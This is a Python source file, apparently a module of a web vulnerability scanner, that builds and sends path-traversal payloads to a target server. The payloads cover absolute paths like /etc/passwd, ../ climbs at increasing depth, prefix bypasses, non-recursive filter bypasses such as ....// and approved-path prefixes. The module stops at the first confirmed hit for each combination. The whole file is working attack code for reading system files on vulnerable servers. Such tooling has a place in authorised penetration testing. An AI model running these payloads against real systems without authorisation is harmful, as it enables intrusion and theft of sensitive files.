r"""Path traversal — the full range of filter/prefix/encoding bypasses.

Covers the File Inclusion technique set:
  * absolute path (/etc/passwd),
  * relative (../../../etc/passwd) at increasing depth,
  * prefix bypass (/../../../etc/passwd) — when input is appended after a prefix,
  * non-recursive filter bypass: ....// , ..././ , ....\/ , ....//// ,
  * approved-path prefix (./languages/../../../etc/passwd),
  * url / double-url encoding, applied by the client per config.
"""
from __future__ import annotations

from collections.abc import Iterator

from ..detection import Finding
from ..http_client import HttpClient
from .base import BaseModule

# Traversal sequences (a prefix that climbs one directory level).
# Note: "....\\/" in the code is the literal string  ....\/  (one backslash).
_SEQUENCES = ["../", "....//", "..././", "....\\/", "....////"]

# Approved-path prefixes that sometimes need to precede the traversal.
_APPROVED_PREFIXES = ["", "languages/", "./languages/", "lang/"]


class TraversalModule(BaseModule):
    name = "traversal"
    description = "Path traversal + filter/prefix/encoding bypasses"

    def _norm(self, target: str) -> str:
        """Relative path with no leading / (for appending the traversal)."""
        return target.lstrip("/").replace("C:/", "").replace("c:/", "")

    def payloads(self) -> Iterator[str]:
        """Full sweep (target x prefix x sequence x depth), no auto-stop —
        used by --all-hits. Normally run() is overridden and stops at the
        first hit per depth, see below.
        """
        for target in self.targets():
            rel = self._norm(target)

            # 1) absolute path — when input goes straight into include()
            yield target
            # 2) prefix bypass — a leading / neutralizes an appended prefix
            yield "/" + rel

            # 3) relative traversal: every sequence x depth x approved-prefix
            for prefix in _APPROVED_PREFIXES:
                for seq in _SEQUENCES:
                    for depth in range(1, self.cfg.max_depth + 1):
                        yield prefix + seq * depth + rel

    async def run(self, client: HttpClient) -> list[Finding]:
        """Auto depth-detection: for each (target, prefix, sequence)
        combination, tries depths 1..max_depth increasing and stops at the
        first confirmation — deeper attempts would hit anyway (excess ../
        past root is usually safely clamped), so they're just extra noise
        against the target. Disabled by --all-hits (which tests every
        depth, as in payloads()).
        """
        if self.cfg.all_hits:
            findings = [f async for f in self._run_all(client)]
            return self.dedup(findings)

        findings: list[Finding] = []
        for target in self.targets():
            rel = self._norm(target)

            for payload in (target, "/" + rel):
                finding = await self._send_eval(client, payload)
                if finding.confirmed:
                    findings.append(finding)

            for prefix in _APPROVED_PREFIXES:
                for seq in _SEQUENCES:
                    for depth in range(1, self.cfg.max_depth + 1):
                        finding = await self._send_eval(client, prefix + seq * depth + rel)
                        if finding.confirmed:
                            findings.append(finding)
                            break  # deeper attempts for this (prefix, seq) are redundant
        return self.dedup(findings)

    async def _run_all(self, client: HttpClient):
        for payload in self.payloads():
            finding = await self._send_eval(client, payload)
            if finding.confirmed:
                yield finding
